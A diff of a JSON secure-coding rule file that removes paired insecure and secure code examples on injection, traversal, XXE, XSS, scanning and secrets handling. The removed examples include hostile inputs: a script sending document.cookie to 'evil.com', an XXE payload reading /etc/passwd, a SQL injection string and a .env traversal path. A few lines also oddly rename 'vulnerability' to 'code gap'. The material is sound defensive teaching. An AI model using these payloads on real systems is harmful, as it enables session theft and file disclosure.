-            "code": "// ❌ Spreading the entire request body into the database update\napp.put('/api/users/:id', async (req, res) => {\n  // Attacker sends: { name: \"Legit\", role: \"admin\", isVerified: true }\n  // ORM writes ALL fields, including role and isVerified\n  const user = await db.users.update(req.params.id, req.body)\n  res.json(user)\n})\n\n// ❌ Sequelize: passing req.body directly to create\napp.post('/api/products', async (req, res) => {\n  // Attacker sends: { name: \"Widget\", price: 0, sellerId: \"other-user-id\" }\n  const product = await Product.create(req.body)  // Creates product with price=0\n  res.json(product)\n})\n\n// ❌ Mongoose: no field filtering\napp.patch('/api/settings', async (req, res) => {\n  // Attacker sends: { theme: \"dark\", creditBalance: 99999 }\n  await Settings.findByIdAndUpdate(req.user.settingsId, req.body)\n  res.json({ success: true })\n})"
-          },
-          "correct": {
-            "lang": "typescript",
-            "code": "import { z } from 'zod'\n\n// ✅ Define exactly which fields the user can update\nconst UpdateUserSchema = z.object({\n  name: z.string().min(1).max(100),\n  email: z.string().email(),\n  avatar: z.string().url().optional(),\n  // role, isVerified, isAdmin are NOT in the schema — silently stripped\n})\n\napp.put('/api/users/:id', async (req, res) => {\n  // Zod strips all fields not in the schema\n  const data = UpdateUserSchema.parse(req.body)\n  // data = { name: \"Legit\", email: \"user@example.com\" }\n  // role, isVerified, and any injected fields are gone\n  const user = await db.users.update(req.params.id, data)\n  res.json(user)\n})\n\n// ✅ Alternative: pick specific fields explicitly\napp.patch('/api/settings', async (req, res) => {\n  const allowedFields = ['theme', 'language', 'timezone', 'notifications'] as const\n  const safeUpdate: Record<string, unknown> = {}\n\n  for (const field of allowedFields) {\n    if (req.body[field] !== undefined) {\n      safeUpdate[field] = req.body[field]\n    }\n  }\n\n  await Settings.findByIdAndUpdate(req.user.settingsId, safeUpdate)\n  res.json({ success: true })\n})"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -881,18 +518,7 @@
         "parameterized-queries",
         "orm"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "typescript",
-            "code": "// ❌ Classic SQL injection — attacker enters: ' OR '1'='1\nconst query = `SELECT * FROM users WHERE email = '${req.body.email}'`\nconst user = await db.raw(query)\n\n// ❌ Still injectable — template literals don't escape\nconst id = req.params.id\nconst result = await db.raw(`SELECT * FROM orders WHERE user_id = ${id}`)\n\n// ❌ ORM bypass — using raw() with interpolation\nconst name = req.query.name\nawait db.raw(`UPDATE products SET name = '${name}' WHERE id = ?`, [id])"
-          },
-          "correct": {
-            "lang": "typescript",
-            "code": "// ✅ Parameterized query — values never interpreted as SQL\nconst user = await db.raw(\n  'SELECT * FROM users WHERE email = ?',\n  [req.body.email]\n)\n\n// ✅ ORM (Prisma) — always parameterized\nconst user = await prisma.user.findFirst({\n  where: { email: req.body.email }\n})\n\n// ✅ ORM (TypeORM) — use parameter binding\nconst user = await userRepo.findOne({\n  where: { email: req.body.email }\n})\n\n// ✅ If raw queries are needed, always bind\nconst result = await db.raw(\n  'SELECT * FROM orders WHERE user_id = ? AND status = ?',\n  [req.user.id, req.query.status]\n)\n\n// ✅ Drizzle ORM — typed and safe\nconst result = await db.select()\n  .from(orders)\n  .where(eq(orders.userId, req.user.id))"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -906,18 +532,7 @@
         "directory-traversal",
         "input-validation"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "typescript",
-            "code": "// ❌ Attacker sends: filename=../../.env\napp.get('/files/:filename', (req, res) => {\n  const filePath = path.join('/uploads', req.params.filename)\n  res.sendFile(filePath)\n  // resolves to: /uploads/../../.env → /.env\n})\n\n// ❌ URL-encoded traversal — %2F..%2F..%2Fetc%2Fpasswd\napp.get('/static', (req, res) => {\n  const file = path.join('./public', req.query.file as string)\n  res.sendFile(file)\n})"
-          },
-          "correct": {
-            "lang": "typescript",
-            "code": "import path from 'path'\nimport fs from 'fs'\n\nconst UPLOAD_DIR = path.resolve('/app/uploads')\n\n// ✅ Resolve full path, then verify it starts with the allowed directory\napp.get('/files/:filename', (req, res) => {\n  const requestedPath = path.resolve(UPLOAD_DIR, req.params.filename)\n\n  // Prevent traversal — resolved path must be inside UPLOAD_DIR\n  if (!requestedPath.startsWith(UPLOAD_DIR + path.sep)) {\n    return res.status(403).json({ error: 'Forbidden' })\n  }\n\n  if (!fs.existsSync(requestedPath)) {\n    return res.status(404).json({ error: 'Not found' })\n  }\n\n  res.sendFile(requestedPath)\n})\n\n// ✅ Use an allowlist of file IDs instead of filenames\napp.get('/files/:fileId', requireAuth, async (req, res) => {\n  const file = await db.files.findFirst({\n    where: { id: req.params.fileId, ownerId: req.user.id }\n  })\n  if (!file) return res.status(404).json({ error: 'Not found' })\n  res.sendFile(path.resolve(UPLOAD_DIR, file.storedName))\n})"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -932,18 +547,7 @@
         "schema",
         "zod"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "typescript",
-            "code": "// ❌ Using req.body directly — no type or shape validation\napp.post('/api/users', async (req, res) => {\n  const { email, age, role } = req.body\n  // attacker can send: { role: 'admin', age: -1, email: null }\n  await db.users.create({ email, age, role })\n})\n\n// ❌ No range or type check on numeric params\napp.get('/api/items', async (req, res) => {\n  const limit = req.query.limit  // string, could be 'DROP TABLE users'\n  const items = await db.items.findMany({ take: limit })\n})"
-          },
-          "correct": {
-            "lang": "typescript",
-            "code": "import { z } from 'zod'\n\n// ✅ Define schema — explicit shape, types, ranges, and safe defaults\nconst CreateUserSchema = z.object({\n  email:    z.string().email().max(254),\n  age:      z.number().int().min(0).max(150),\n  username: z.string().min(3).max(32).regex(/^[a-zA-Z0-9_]+$/),\n  // role is NOT accepted from client — set server-side\n})\n\napp.post('/api/users', async (req, res) => {\n  const result = CreateUserSchema.safeParse(req.body)\n  if (!result.success) {\n    return res.status(400).json({ errors: result.error.flatten() })\n  }\n  const { email, age, username } = result.data\n  await db.users.create({ email, age, username, role: 'user' }) // role set by server\n})\n\n// ✅ Query params with safe coercion and limits\nconst ListSchema = z.object({\n  limit:  z.coerce.number().int().min(1).max(100).default(20),\n  offset: z.coerce.number().int().min(0).default(0),\n  search: z.string().max(100).optional(),\n})\n\napp.get('/api/items', async (req, res) => {\n  const { limit, offset, search } = ListSchema.parse(req.query)\n  const items = await db.items.findMany({ take: limit, skip: offset })\n  res.json(items)\n})"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -958,18 +562,7 @@
         "external-entities",
         "ssrf"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "typescript",
-            "code": "// ❌ node-expat, libxmljs — external entities enabled by default\nimport libxmljs from 'libxmljs'\nconst doc = libxmljs.parseXml(req.body)  // external entities resolved!\n\n// ❌ SAML/XML libraries that don't disable DTD\nimport { parseString } from 'xml2js'\nparseString(req.body, callback)  // check if noent: false is needed\n\n// Example malicious payload:\n// <?xml version=\"1.0\"?>\n// <!DOCTYPE foo [\n//   <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n// ]>\n// <data>&xxe;</data>"
-          },
-          "correct": {
-            "lang": "typescript",
-            "code": "// ✅ Use fast-xml-parser — no DTD support by design\nimport { XMLParser } from 'fast-xml-parser'\n\nconst parser = new XMLParser({\n  allowBooleanAttributes: true,\n})\nconst result = parser.parse(req.body)\n\n// ✅ xml2js — disable entity expansion\nimport { parseStringPromise } from 'xml2js'\nconst result = await parseStringPromise(req.body, {\n  explicitArray: false,\n  // xml2js uses sax.js internally which doesn't process external entities\n})\n\n// ✅ For SAML libraries — verify XXE is disabled in the library config\n// Use xmldom with external entities disabled:\nimport { DOMParser } from '@xmldom/xmldom'\nconst parser = new DOMParser({\n  errorHandler: {\n    warning: () => {},\n    error: (msg: string) => { throw new Error(msg) },\n    fatalError: (msg: string) => { throw new Error(msg) },\n  },\n})\nconst doc = parser.parseFromString(xml, 'text/xml')\n\n// ✅ If you control schema — reject XML with DOCTYPE entirely\nfunction stripDoctype(xml: string): string {\n  if (/<!DOCTYPE/i.test(xml)) {\n    throw new Error('DOCTYPE is not allowed')\n  }\n  return xml\n}\nconst safeXml = stripDoctype(req.body)"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -985,45 +578,23 @@
         "csp",
         "react"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "typescript",
-            "code": "// ❌ Direct innerHTML — executes attacker's script\ndocument.getElementById('name').innerHTML = user.name\n// user.name = '<script>fetch(\"evil.com?c=\"+document.cookie)</script>'\n\n// ❌ dangerouslySetInnerHTML without sanitization\nfunction Comment({ content }: { content: string }) {\n  return <div dangerouslySetInnerHTML={{ __html: content }} />\n}\n\n// ❌ Server-side template injection\napp.get('/hello', (req, res) => {\n  res.send(`<h1>Hello ${req.query.name}</h1>`)\n  // ?name=<script>alert(1)</script>\n})"
-          },
-          "correct": {
-            "lang": "typescript",
-            "code": "// ✅ React auto-escapes JSX expressions — use text content\nfunction UserName({ name }: { name: string }) {\n  return <span>{name}</span>  // safe — React escapes by default\n}\n\n// ✅ If HTML rendering is required, sanitize with DOMPurify\nimport DOMPurify from 'dompurify'\n\nfunction RichContent({ html }: { html: string }) {\n  const clean = DOMPurify.sanitize(html, {\n    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'li'],\n    ALLOWED_ATTR: ['href', 'target'],\n  })\n  return <div dangerouslySetInnerHTML={{ __html: clean }} />\n}\n\n// ✅ Server-side: use a template engine that auto-escapes (Handlebars, Nunjucks)\n// or escape manually\nimport { escape } from 'html-escaper'\napp.get('/hello', (req, res) => {\n  const name = escape(req.query.name as string)\n  res.send(`<h1>Hello ${name}</h1>`)\n})\n\n// ✅ Use textContent, not innerHTML for DOM updates\nelement.textContent = userInput  // safe\n// element.innerHTML = userInput  ❌ unsafe"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
       "rule": "sast-codeql",
-      "title": "Enable GitHub CodeQL for Automated Vulnerability Discovery",
+      "title": "Enable GitHub CodeQL for Automated Code gap Discovery",
       "impact": "HIGH",
       "tags": [
         "security",
         "sast",
         "codeql",
         "github",
-        "vulnerability-scanning",
+        "code gap-scanning",
         "code-scanning",
         "dataflow-analysis"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "typescript",
-            "code": "// ❌ CodeQL: js/sql-injection — tracks req.query.id → db.query\napp.get('/user', async (req, res) => {\n  const id = req.query.id                        // Source: HTTP input\n  const user = await db.raw(`SELECT * FROM users WHERE id = ${id}`)  // Sink: SQL query\n  res.json(user)\n})\n\n// ❌ CodeQL: js/reflected-xss — tracks req.query.name → res.send\napp.get('/hello', (req, res) => {\n  const name = req.query.name                    // Source: HTTP input\n  res.send(`<h1>Hello ${name}</h1>`)             // Sink: HTML response\n})\n\n// ❌ CodeQL: js/path-injection — tracks req.params.file → readFileSync\napp.get('/download', (req, res) => {\n  const file = req.params.filename               // Source: HTTP input\n  const content = fs.readFileSync('./files/' + file)  // Sink: file system\n  res.send(content)\n})"
-          },
-          "correct": {
-            "lang": "yaml",
-            "code": "# ✅ .github/workflows/codeql.yml — recommended setup\nname: CodeQL Security Analysis\non:\n  push:\n    branches: [main, develop]\n  pull_request:\n    branches: [main, develop]\n  schedule:\n    - cron: '0 6 * * 1'  # Weekly full scan on Monday 6am\n\njobs:\n  codeql:\n    name: CodeQL Analysis\n    runs-on: ubuntu-latest\n    permissions:\n      actions:         read\n      contents:        read\n      security-events: write   # required to upload SARIF results\n\n    strategy:\n      fail-fast: false\n      matrix:\n        language: [javascript-typescript]\n        # Add: python, java, csharp, go, ruby as needed\n\n    steps:\n      - name: Checkout code\n        uses: actions/checkout@v4\n\n      - name: Initialize CodeQL\n        uses: github/codeql-action/init@v3\n        with:\n          languages: ${{ matrix.language }}\n          # ✅ Use security-extended for broader coverage (includes experimental queries)\n          queries: security-extended\n          # queries: security-and-quality  # even more rules\n\n      - name: Setup Node.js (for autobuild)\n        uses: actions/setup-node@v4\n        with:\n          node-version: 22\n\n      - name: Autobuild\n        uses: github/codeql-action/autobuild@v3\n        # Or replace with manual build steps for complex projects:\n        # - run: npm ci && npm run build\n\n      - name: Perform CodeQL Analysis\n        uses: github/codeql-action/analyze@v3\n        with:\n          category: \"/language:${{ matrix.language }}\"\n          upload: true            # uploads SARIF to GitHub Security tab\n          # Results appear in: Security → Code scanning alerts"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -1039,18 +610,7 @@
         "ci",
         "enforcement"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "typescript",
-            "code": "// ❌ Semgrep rule: ban-string-concat-sql\nconst user = await db.query(\"SELECT * FROM users WHERE id = \" + req.params.id)\n\n// ❌ Semgrep rule: require-jwt-algorithm\nconst decoded = jwt.verify(token, secret)  // no algorithm specified\n\n// ❌ Semgrep rule: ban-eval\nconst result = eval(userInput)\n\n// ❌ Semgrep rule: ban-dangerously-set-inner-html-raw\n<div dangerouslySetInnerHTML={{ __html: content }} />\n\n// ❌ Semgrep rule: no-math-random-for-crypto\nconst token = Math.random().toString(36)  // not cryptographically secure"
-          },
-          "correct": {
-            "lang": "yaml",
-            "code": "# ✅ .semgrep/security.yml — custom org rules\nrules:\n  # Ban string-concatenated SQL queries\n  - id: ban-string-concat-sql\n    patterns:\n      - pattern: $DB.query(\"...\" + ...)\n      - pattern: $DB.query(`...${...}...`)\n    message: \"SQL string concatenation detected. Use parameterized queries: db.query('...', [params])\"\n    languages: [typescript, javascript]\n    severity: ERROR\n    metadata:\n      cwe: \"CWE-89\"\n      owasp: \"A03:2021\"\n\n  # Require algorithm option in jwt.verify\n  - id: require-jwt-algorithm\n    pattern: jwt.verify($TOKEN, $SECRET)\n    pattern-not: jwt.verify($TOKEN, $SECRET, {algorithms: [...]})\n    message: \"jwt.verify() must specify an algorithms array to prevent algorithm confusion attacks\"\n    languages: [typescript, javascript]\n    severity: ERROR\n    metadata:\n      cwe: \"CWE-347\"\n\n  # Ban eval() usage\n  - id: ban-eval\n    pattern: eval(...)\n    message: \"eval() is a security risk. Use JSON.parse() for data or refactor to avoid dynamic code execution.\"\n    languages: [typescript, javascript]\n    severity: ERROR\n    metadata:\n      cwe: \"CWE-95\"\n\n  # Ban Math.random() for security-sensitive values\n  - id: no-math-random-crypto\n    patterns:\n      - pattern: Math.random()\n      - pattern-inside: |\n          $TOKEN = ...\n    message: \"Math.random() is not cryptographically secure. Use crypto.randomBytes() or crypto.randomUUID()\"\n    languages: [typescript, javascript]\n    severity: WARNING\n    metadata:\n      cwe: \"CWE-338\"\n\n  # Detect unvalidated redirects\n  - id: unvalidated-redirect\n    patterns:\n      - pattern: res.redirect($URL)\n      - pattern-not: res.redirect(\"/...\")\n      - pattern-not-inside: |\n          if (ALLOWED_URLS.includes($URL)) { ... }\n    message: \"Open redirect detected. Validate redirect URLs against an allowlist.\"\n    languages: [typescript, javascript]\n    severity: ERROR\n    metadata:\n      cwe: \"CWE-601\"\n\n  # Ensure all express routes have auth middleware\n  - id: express-missing-auth-middleware\n    patterns:\n      - pattern: app.$METHOD('/api/...', $HANDLER)\n      - pattern-not: app.$METHOD('/api/...', requireAuth, ...)\n      - pattern-not: app.$METHOD('/api/public/...', ...)\n    message: \"API route missing requireAuth middleware. Add authentication or move to /api/public/\"\n    languages: [typescript, javascript]\n    severity: WARNING"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -1067,18 +627,7 @@
         "static-analysis",
         "security-hotspots"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "typescript",
-            "code": "// ❌ This code gets merged with no SAST check:\napp.get('/user', async (req, res) => {\n  // SQL injection — SonarQube rule: S3649 \"SQL queries should not be vulnerable to injection attacks\"\n  const result = await db.query(`SELECT * FROM users WHERE id = ${req.query.id}`)\n  res.json(result)\n})\n\n// ❌ Hardcoded password — SonarQube rule: S2068 \"Credentials should not be hard-coded\"\nconst password = 'admin123'\n\n// ❌ Path traversal — SonarQube rule: S6096\nconst file = fs.readFileSync('./uploads/' + req.params.name)"
-          },
-          "correct": {
-            "lang": "yaml",
-            "code": "# ✅ sonar-project.properties — project configuration\nsonar.projectKey=my-org_my-project\nsonar.projectName=My Project\nsonar.sources=src\nsonar.tests=src\nsonar.test.inclusions=**/*.test.ts,**/*.spec.ts\nsonar.typescript.lcov.reportPaths=coverage/lcov.info\n\n# Security-focused quality gate settings (configure in SonarQube UI):\n# Gate: \"Security Gate\"\n# Condition 1: New Vulnerabilities = 0        (blocks on any new vuln)\n# Condition 2: New Security Hotspots = 0      (requires hotspot review)\n# Condition 3: Security Rating on New Code: A  (no critical/high vulns)"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -1097,18 +646,7 @@
         "npm-audit",
         "osv"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "bash",
-            "code": "# ❌ Specific versions with known CRITICAL CVEs installed without scanning\nnpm install lodash@4.17.4        # CVE-2019-10744 CRITICAL — prototype pollution\nnpm install axios@0.21.0         # CVE-2021-3749 HIGH — ReDoS\nnpm install jsonwebtoken@8.5.1   # CVE-2022-23529 HIGH — arbitrary file write\nnpm install minimist@1.2.5       # CVE-2021-44906 CRITICAL — prototype pollution\nnpm install log4js@6.3.0         # CVE-2022-21704 HIGH — sensitive info exposure\n\n# ❌ CI pipeline with no version-CVE gate\nnpm install\nnpm run build\ndocker push myapp:latest  # vulnerable versions shipped to production"
-          },
-          "correct": {
-            "lang": "bash",
-            "code": "# ✅ Layer 1: npm audit before install (catches known bad versions immediately)\nnpm audit --audit-level=high || exit 1\nnpm install\n\n# ✅ Layer 2: Check specific package versions against OSV database\n# OSV (Open Source Vulnerabilities) — Google's free, fast CVE API\ncurl -s -X POST https://api.osv.dev/v1/query \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"version\": \"4.17.4\",\n    \"package\": { \"name\": \"lodash\", \"ecosystem\": \"npm\" }\n  }' | jq '.vulns | length'\n# Returns number of known vulnerabilities for this exact version"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -1126,18 +664,7 @@
         "cve",
         "jfrog-platform"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "bash",
-            "code": "# ❌ Artifactory without Xray — any artifact is served regardless of CVEs\ncurl -u user:password \\\n  \"https://artifactory.example.com/artifactory/npm-local/lodash/-/lodash-4.17.4.tgz\" \\\n  -O\n# lodash 4.17.4 has CVE-2019-10744 (CRITICAL — prototype pollution)\n# No scan, no block, no alert"
-          },
-          "correct": {
-            "lang": "bash",
-            "code": "# ✅ Step 1: Create a Security Policy via Xray REST API\ncurl -u admin:password -X POST \\\n  \"https://xray.example.com/api/v2/policies\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"name\": \"block-high-critical-cves\",\n    \"type\": \"security\",\n    \"rules\": [\n      {\n        \"name\": \"block-critical\",\n        \"criteria\": {\n          \"min_severity\": \"High\",\n          \"fix_version_dependant\": false\n        },\n        \"actions\": {\n          \"webhooks\": [],\n          \"mails\": [\"security-team@example.com\"],\n          \"block_download\": {\n            \"unscanned\": true,\n            \"active\": true\n          },\n          \"block_release_bundle_distribution\": true,\n          \"fail_build\": true,\n          \"notify_deployer\": true,\n          \"notify_watch_recipients\": true\n        },\n        \"priority\": 1\n      }\n    ]\n  }'\n\n# ✅ Step 2: Create a Watch that applies the policy to all repos\ncurl -u admin:password -X POST \\\n  \"https://xray.example.com/api/v2/watches\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"general_data\": {\n      \"name\": \"all-repos-watch\",\n      \"description\": \"Watch all repositories for HIGH/CRITICAL CVEs\",\n      \"active\": true\n    },\n    \"project_resources\": {\n      \"resources\": [\n        {\n          \"type\": \"all_repos\",\n          \"filters\": []\n        }\n      ]\n    },\n    \"assigned_policies\": [\n      { \"name\": \"block-high-critical-cves\", \"type\": \"security\" }\n    ]\n  }'"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -1154,18 +681,7 @@
         "ci",
         "multi-language"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "bash",
-            "code": "# ❌ Dependencies scanned only with npm audit — language-limited, not exhaustive\nnpm audit --audit-level=high\n# Misses: transitive jar files, Python packages bundled in Docker, .NET libs"
-          },
-          "correct": {
-            "lang": "yaml",
-            "code": "# ✅ GitHub Actions — OWASP Dependency Check with CVSS threshold\nname: OWASP Dependency Check\non: [push, pull_request]\n\njobs:\n  dependency-check:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Run OWASP Dependency Check\n        uses: dependency-check/Dependency-Check_Action@main\n        with:\n          project:    \"${{ github.repository }}\"\n          path:       \".\"\n          format:     \"HTML,JSON,SARIF\"\n          args: >-\n            --failOnCVSS 7\n            --enableRetired\n            --enableExperimental\n            --nvdApiKey ${{ secrets.NVD_API_KEY }}\n            --suppressionFile .odc-suppressions.xml\n        env:\n          JAVA_HOME: /opt/jdk\n\n      - name: Upload report\n        if: always()\n        uses: actions/upload-artifact@v4\n        with:\n          name: odc-report\n          path: reports/\n\n      - name: Upload SARIF to GitHub Security tab\n        if: always()\n        uses: github/codeql-action/upload-sarif@v3\n        with:\n          sarif_file: reports/dependency-check-report.sarif"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -1182,18 +698,7 @@
         "compliance",
         "ntia"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "bash",
-            "code": "# ❌ No SBOM generated — when Log4Shell (CVE-2021-44228) dropped:\n# Question: \"Do we use Log4j?\"\n# Answer: \"We need to grep every repo manually... this will take days\"\n# Impact: 72-hour incident response delay"
-          },
-          "correct": {
-            "lang": "yaml",
-            "code": "# ✅ GitHub Actions — generate CycloneDX SBOM on every release\nname: Generate SBOM\non:\n  push:\n    branches: [main]\n  release:\n    types: [created]\n\njobs:\n  sbom:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n      packages: write\n      security-events: write\n\n    steps:\n      - uses: actions/checkout@v4\n\n      # ✅ CycloneDX SBOM for Node.js\n      - name: Generate CycloneDX SBOM\n        uses: CycloneDX/gh-node-module-generatebom@v1\n        with:\n          path: \"./\"\n          output: \"./bom.json\"\n\n      # ✅ Syft for richer multi-ecosystem SBOM (also supports Docker)\n      - name: Generate SBOM with Syft\n        uses: anchore/sbom-action@v0\n        with:\n          path:            \"./\"\n          format:          \"cyclonedx-json\"   # or spdx-json\n          output-file:     \"./sbom.cyclonedx.json\"\n          artifact-name:   \"sbom-${{ github.sha }}\"\n\n      # ✅ Attach SBOM to GitHub release\n      - name: Upload SBOM to release\n        if: github.event_name == 'release'\n        uses: softprops/action-gh-release@v2\n        with:\n          files: ./sbom.cyclonedx.json\n\n      # ✅ Publish SBOM as OCI artifact alongside container image\n      - name: Attach SBOM to container\n        run: |\n          docker build -t myapp:${{ github.sha }} .\n          docker push myapp:${{ github.sha }}\n          # Attach SBOM as OCI attestation\n          cosign attest --predicate sbom.cyclonedx.json \\\n            --type cyclonedx \\\n            myapp:${{ github.sha }}"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -1212,18 +717,7 @@
         "cve",
         "aquasec"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "dockerfile",
-            "code": "# ❌ Base image with hundreds of known CVEs — never scanned\nFROM node:18\n# node:18 (Debian bookworm) may carry 50+ OS-level CVEs at any given time\nCOPY . .\nRUN npm install"
-          },
-          "correct": {
-            "lang": "dockerfile",
-            "code": "# ✅ Use minimal base images to reduce attack surface\nFROM node:22-alpine AS builder\nWORKDIR /app\nCOPY package*.json ./\nRUN npm ci --omit=dev\nCOPY . .\n\n# ✅ Final image — distroless has near-zero OS CVEs\nFROM gcr.io/distroless/nodejs22-debian12\nWORKDIR /app\nCOPY --from=builder /app .\nCMD [\"server.js\"]"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -1238,18 +732,7 @@
         "doppler",
         "environment"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "bash",
-            "code": "# ❌ .env.production stored in repo or on developer laptop\nSTRIPE_SECRET_KEY=sk_live_abc123\nDB_PASSWORD=prod_super_secret\nJWT_SECRET=my_jwt_secret_key\nAWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
-          },
-          "correct": {
-            "lang": "typescript",
-            "code": "// ✅ AWS Secrets Manager — fetch at startup, cache in memory\nimport { SecretsManagerClient, GetSecretValueCommand } from '@aws-sdk/client-secrets-manager'\n\nconst smClient = new SecretsManagerClient({ region: process.env.AWS_REGION })\n\ninterface AppSecrets {\n  stripeSecretKey: string\n  dbPassword: string\n  jwtSecret: string\n}\n\nlet _secrets: AppSecrets | null = null\n\nexport async function getSecrets(): Promise<AppSecrets> {\n  if (_secrets) return _secrets\n  const response = await smClient.send(\n    new GetSecretValueCommand({ SecretId: 'prod/myapp/secrets' })\n  )\n  _secrets = JSON.parse(response.SecretString!) as AppSecrets\n  return _secrets\n}\n\n// ✅ Doppler (inject at runtime via CLI — no SDK needed)\n// doppler run -- node dist/server.js\n// Secrets are available as process.env.STRIPE_SECRET_KEY etc.\n\n// ✅ HashiCorp Vault with app role\nimport vault from 'node-vault'\nconst client = vault({ endpoint: process.env.VAULT_ADDR, token: process.env.VAULT_TOKEN })\nconst { data } = await client.read('secret/data/myapp')\nconst stripeKey = data.data.stripe_secret_key"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -1264,18 +747,7 @@
         "environment-variables",
         "hardcoded"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "typescript",
-            "code": "// ❌ Hardcoded API key — visible in git history forever\nconst stripe = new Stripe('sk_live_YOUR_STRIPE_SECRET_KEY')\n\n// ❌ Hardcoded database URL with credentials\nconst db = new PrismaClient({\n  datasources: { db: { url: 'postgresql://admin:password123@prod.db.example.com/mydb' } }\n})\n\n// ❌ JWT secret in source\nconst token = jwt.sign(payload, 'my-super-secret-jwt-key')\n\n// ❌ Hardcoded in config file committed to repo\n// config.json\n// { \"aws_secret\": \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\" }"
-          },
-          "correct": {
-            "lang": "typescript",
-            "code": "// ✅ Load from environment — injected by secrets manager at runtime\nconst stripe = new Stripe(process.env.STRIPE_SECRET_KEY!)\n\n// ✅ Fail fast if required secrets are missing\nfunction requireEnv(key: string): string {\n  const value = process.env[key]\n  if (!value) throw new Error(`Missing required environment variable: ${key}`)\n  return value\n}\n\nconst JWT_SECRET   = requireEnv('JWT_SECRET')\nconst DATABASE_URL = requireEnv('DATABASE_URL')\nconst STRIPE_KEY   = requireEnv('STRIPE_SECRET_KEY')\n\n// ✅ Use a secrets manager (AWS Secrets Manager, HashiCorp Vault, Doppler)\nimport { SecretsManagerClient, GetSecretValueCommand } from '@aws-sdk/client-secrets-manager'\nconst client = new SecretsManagerClient({ region: 'us-east-1' })\n\nasync function getSecret(secretId: string): Promise<string> {\n  const response = await client.send(new GetSecretValueCommand({ SecretId: secretId }))\n  return response.SecretString!\n}\nconst stripeKey = await getSecret('prod/stripe/secret-key')"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -1290,18 +762,7 @@
         "key-management",
         "zero-downtime"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "typescript",
-            "code": "// ❌ Hardcoded API key — never rotated, valid forever after leak\nconst STRIPE_KEY = process.env.STRIPE_SECRET_KEY\n// This key was set 18 months ago and never changed\n// If leaked via logs, git history, or memory dump, attacker has permanent access\n\n// ❌ Database password — manual rotation causes downtime\n// .env file:\n// DB_PASSWORD=production_password_2024\n// Changed manually once a year — requires app restart\n// No overlap period — old password stops working immediately"
-          },
-          "correct": {
-            "lang": "typescript",
-            "code": "// ✅ AWS Secrets Manager with automatic rotation\nimport { SecretsManagerClient, GetSecretValueCommand } from '@aws-sdk/client-secrets-manager'\n\nconst client = new SecretsManagerClient({ region: 'us-east-1' })\n\n// Fetch the current secret on every use — always gets the latest rotated value\nasync function getDbCredentials(): Promise<{ username: string; password: string }> {\n  const result = await client.send(\n    new GetSecretValueCommand({\n      SecretId: 'prod/database/credentials',\n      VersionStage: 'AWSCURRENT',  // Always the current, rotated version\n    })\n  )\n  return JSON.parse(result.SecretString!)\n}\n\n// ✅ Connection pool that refreshes credentials on authentication failure\nasync function createPool() {\n  const creds = await getDbCredentials()\n  const pool = new Pool({\n    user: creds.username,\n    password: creds.password,\n    host: process.env.DB_HOST,\n    // On auth failure, refresh credentials (rotation may have occurred)\n    connectionErrorHandler: async (err) => {\n      if (err.message.includes('authentication failed')) {\n        const newCreds = await getDbCredentials()\n        pool.options.password = newCreds.password\n      }\n    },\n  })\n  return pool\n}"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -1317,18 +778,7 @@
         "pre-commit",
         "trufflehog"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "bash",
-            "code": "# ❌ No pre-commit hook — secret committed without warning\ngit add .env.production\ngit commit -m \"add config\"\ngit push origin main\n# Automated bot finds stripe key within 60 seconds"
-          },
